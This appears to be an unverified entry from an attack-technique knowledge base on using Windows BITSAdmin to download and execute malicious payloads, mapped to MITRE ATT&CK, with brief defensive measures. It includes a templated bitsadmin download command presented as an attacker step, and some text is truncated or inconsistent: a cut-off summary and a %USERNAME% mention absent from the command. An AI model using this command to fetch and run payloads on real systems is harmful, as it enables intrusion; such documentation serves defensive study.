---
id: 84388285-74e7-4a4b-89d7-91e0d4a1f3cf
name: BITSAdmin Download and Execute
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:27.054029+00:00'
updated_at: '2023-04-10T20:37:10.270342+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Remote File Copy|T1105 - Remote File Copy]]'
tags:
- '[[Bitsadmin]]'
- '[[Windows - Download and execute methods]]'
---

# BITSAdmin Download and Execute

## Summary

BITSAdmin is a command-line tool used for file transfer jobs. Attackers can use this tool to download and execute malicious payloads on a target system. The utility is often used to transfer files asynchronously in the background, making it difficult to detect. In this procedure, the attacker uses 

## Description

# Description

BITSAdmin is a command-line tool used for file transfer jobs. Attackers can use this tool to download and execute malicious payloads on a target system. The utility is often used to transfer files asynchronously in the background, making it difficult to detect. In this procedure, the attacker uses BITSAdmin to download and execute malicious files on the target system. The attacker can use this technique to gain persistence on the target system and maintain access for long periods of time.

Technical Explanation:
1. The attacker uses the BITSAdmin tool to create a download job.
2. The attacker specifies the URL of the malicious payload to be downloaded and the location where it should be saved.
3. The attacker creates a second job to execute the downloaded payload.

Business Value:
This technique can be used by attackers to gain access to sensitive data, steal credentials or install additional malware on the target system. It can cause significant damage to the victim's reputation and financial losses.

## Requirements

1. Access to the command-line interface of the target system

1. BITSAdmin tool installed on the target system

## Defense

1. Restrict the use of BITSAdmin tool using Group Policy

1. Implement network segmentation to prevent lateral movement

1. Monitor network traffic for suspicious activity

## Objectives

1. Download and execute malicious payloads on the target system

# Instructions

1. To download a file using Bitsadmin, use the following command:

bitsadmin /transfer mydownloadjob /download /priority normal <URL> <destination_path>

Replace <URL> with the URL of the file you want to download and <destination_path> with the path where you want to save the file on your system. You can also specify a custom name for the job by replacing 'mydownloadjob' with a name of your choice.

**Code**: [[bitsadmin /transfer mydownloadjob /download /prior]]

> This command uses the Bitsadmin tool to download a file from a remote server. The /transfer option creates a new job and /download specifies that the job is for downloading a file. The /priority option sets the priority of the job to normal. The first argument after the options is the URL of the file to download and the second argument is the destination path where the file will be saved on the local system. The %USERNAME% variable is used to specify the current user's username in the destination path. This command can be used by attackers to download malicious files onto a victim's system.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Remote File Copy|T1105 - Remote File Copy]]

## Tags

- [[Bitsadmin]]
- [[Windows - Download and execute methods]]
